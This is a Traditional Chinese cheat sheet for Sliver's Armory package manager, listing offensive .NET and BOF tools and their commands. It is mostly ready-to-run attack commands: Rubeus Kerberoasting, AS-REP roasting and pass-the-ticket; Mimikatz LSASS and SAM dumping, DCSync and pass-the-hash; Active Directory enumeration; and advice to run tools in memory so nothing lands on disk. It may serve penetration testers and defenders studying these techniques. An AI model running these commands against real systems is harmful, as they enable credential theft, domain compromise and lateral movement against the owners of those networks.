# Sliver — Armory 套件管理

Armory 是 Sliver 的延伸套件管理器，提供預編譯的 BOF、.NET Assembly 等工具，類似 Cobalt Strike 的 BOF 生態系。

---

## 基本操作

```bash
armory                    # 列出已安裝套件
armory update             # 更新套件清單
armory search <KEYWORD>   # 搜尋套件
armory install <PACKAGE>  # 安裝套件
armory install all        # 安裝全部套件
armory remove <PACKAGE>   # 移除套件
```

---

## 常用套件清單

| 套件名稱 | 功能 | 典型用途 |
|---------|------|---------|
| `rubeus` | Kerberos 攻擊工具 | AS-REP Roasting、Pass-the-Ticket、Kerberoasting |
| `sharp-hound` | BloodHound 資料收集 | AD 路徑分析 |
| `seatbelt` | 系統安全配置枚舉 | 本地提權資訊收集 |
| `mimikatz` | 憑證提取 | LSASS Dump、Pass-the-Hash |
| `sharp-up` | 本地提權漏洞掃描 | 自動找提權路徑 |
| `sharp-view` | AD 枚舉（PowerView .NET 版）| ACL、Trust、GPO 分析 |
| `sharp-wmi` | WMI 指令執行 | 橫向移動 |
| `sharp-dpapi` | DPAPI 解密 | 瀏覽器密碼、Credential Manager |
| `sharp-chrome` | Chrome 密碼提取 | 本地憑證收集 |
| `sharp-dnsdump` | DNS 記錄 Dump | 內網資產發現 |

---

## 常用套件用法

### Rubeus（Kerberos 攻擊）

```bash
# 取得 TGT
rubeus asktgt /user:administrator /password:P@ssw0rd /domain:corp.local /nowrap

# AS-REP Roasting（不需密碼）
rubeus asreproast /format:hashcat /outfile:asrep.txt

# Kerberoasting
rubeus kerberoast /format:hashcat /outfile:kerb.txt

# Pass-the-Ticket
rubeus ptt /ticket:<BASE64_TICKET>

# 查看當前票票
rubeus triage
rubeus dump /nowrap
```

### SharpHound（BloodHound 收集）

```bash
sharp-hound --CollectionMethods All --ZipFileName loot.zip
sharp-hound --CollectionMethods DCOnly              # 只收集 DC 資料
sharp-hound --CollectionMethods Session,LoggedOn    # 登入資訊
```

### Seatbelt（系統枚舉）

```bash
seatbelt -group=all          # 全部檢查
seatbelt -group=system       # 系統資訊
seatbelt -group=user         # 使用者資訊
seatbelt -group=misc         # 其他資訊
seatbelt TokenPrivileges     # 特權檢查
seatbelt CredentialFiles     # 憑證檔案
seatbelt WindowsCredentialFiles
seatbelt DotNetVersions
```

### Mimikatz

```bash
# Dump LSASS
mimikatz "sekurlsa::logonpasswords" exit
mimikatz "lsadump::sam" exit
mimikatz "lsadump::dcsync /domain:corp.local /user:administrator" exit

# Pass-the-Hash
mimikatz "sekurlsa::pth /user:admin /domain:corp.local /ntlm:<HASH>" exit
```

### SharpView（AD 枚舉）

```bash
sharp-view Get-DomainUser
sharp-view Get-DomainGroup --Identity "Domain Admins"
sharp-view Get-DomainComputer
sharp-view Get-ObjectAcl --Identity administrator
sharp-view Find-InterestingDomainAcl
```

---

## 安裝流程

```bash
sliver > armory update
sliver > armory install rubeus
sliver > armory install sharp-hound
sliver > armory install seatbelt

# 進入 Session 後直接執行（記憶體內，不落地）
sliver (SESSION) > rubeus asktgt /user:... 
sliver (SESSION) > seatbelt -group=all
sliver (SESSION) > sharp-hound --CollectionMethods All
```
